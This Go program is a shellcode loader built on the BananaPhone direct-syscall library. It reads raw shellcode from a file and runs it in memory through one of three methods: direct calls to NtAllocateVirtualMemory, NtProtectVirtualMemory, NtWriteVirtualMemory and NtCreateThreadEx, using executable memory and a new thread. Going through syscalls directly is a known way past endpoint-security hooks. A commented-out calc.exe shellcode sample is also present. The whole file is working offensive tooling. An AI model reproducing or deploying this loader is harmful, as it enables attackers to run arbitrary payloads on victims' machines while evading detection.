package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)
/*
var shellcode1 = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}
*/
//example of using bananaphone to execute shellcode in the current thread.
func main() {
	var shellcode []byte
	fun := os.Args[2]
	//fun := "1"
	fileObj, err := os.Open(os.Args[1])
	//fileObj, err := os.Open("loader.bin")
	shellcode, err = ioutil.ReadAll(fileObj)
	if err != nil {
		return
	}

	fmt.Println("Mess with the banana, die like the... banana?") //I found it easier to breakpoint the consolewrite function to mess with the in-memory ntdll to verify the auto-switch to disk works sanely than to try and live-patch it programatically.

	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	prote, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}
	wr1te, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	cth, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}

	if fun == "1"{
		createThread(shellcode, uintptr(0xffffffffffffffff), alloc)
	}
	if fun == "2"{
		create(shellcode,uintptr(0xffffffffffffffff),prote)
	}
	if fun == "3"{
		createTh(shellcode,uintptr(0xffffffffffffffff),alloc,wr1te,cth)
	}


}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid uint16) {
	const (
		//thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	shellcode = append(shellcode,[]byte("0x00")[0])
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	syscall.Syscall(baseA, 0, 0, 0, 0)

}


func create(scci []byte,hand1e uintptr, prot uint16){
	rawShellcode := append(scci,[]byte("0x00")[0])
	//init
	targetPtr := func() {
	}
	var old uint32
	thisThread := hand1e
	regionsize := uintptr(len(rawShellcode))
	//NtProtectVirtualMemory
	_, r := bananaphone.Syscall(
		prot,
		uintptr(thisThread),
		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&targetPtr)))),
		uintptr((unsafe.Pointer(&regionsize))),
		syscall.PAGE_READWRITE,
		uintptr((unsafe.Pointer(&old))),
	)
	if r != nil {
		return
	}

	//change addr
	*(**uintptr)(unsafe.Pointer(&targetPtr)) = (*uintptr)(unsafe.Pointer(&rawShellcode))


	//os.Stdout, _ = os.Open(os.DevNull)
	fmt.Println(len(rawShellcode))
	var old0 uint32

	//NtProtectVirtualMemory
	_, r = bananaphone.Syscall(
		prot,
		uintptr(thisThread),
		uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&rawShellcode)))),
		uintptr((unsafe.Pointer(&regionsize))),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr((unsafe.Pointer(&old0))),
	)
	if r != nil {
		return
	}

	//execute
	syscall.Syscall(uintptr(unsafe.Pointer(&rawShellcode[0])),0, 0, 0, 0,)
}

func createTh(scci []byte,hand1e uintptr, a11o,wr1te,cth uint16) {
	shellcode := append(scci,[]byte("0x00")[0])
	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)
	//hand1e := uintptr(windows.CurrentProcess()) //special macro that says 'use this thread/process' when provided as a handle.
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	_, r := bananaphone.Syscall(
		a11o, //Ntallocatevirtualmemory
		hand1e,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		return
	}
	//NtWriteVirtualMemory
	_, r = bananaphone.Syscall(
		wr1te, //NtWriteVirtualMemory
		hand1e,
		baseA,
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionsize,
		0,
	)
	if r != nil {
		return
	}
	var hhosthread uintptr
	_, r = bananaphone.Syscall(
		cth,                                  //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		hand1e,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		return
	}
}

